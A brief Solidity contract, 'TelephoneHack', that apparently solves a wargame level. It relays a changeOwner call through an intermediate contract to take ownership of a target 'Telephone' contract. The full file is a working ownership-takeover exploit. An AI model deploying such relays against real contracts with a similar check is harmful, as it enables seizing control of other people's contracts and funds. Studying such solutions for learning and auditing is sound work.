// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    ITelephone public target;

    constructor(address target_) {
        target = ITelephone(target_);
    }

    function forward(address argv) public {
        target.changeOwner(argv);
    }
}
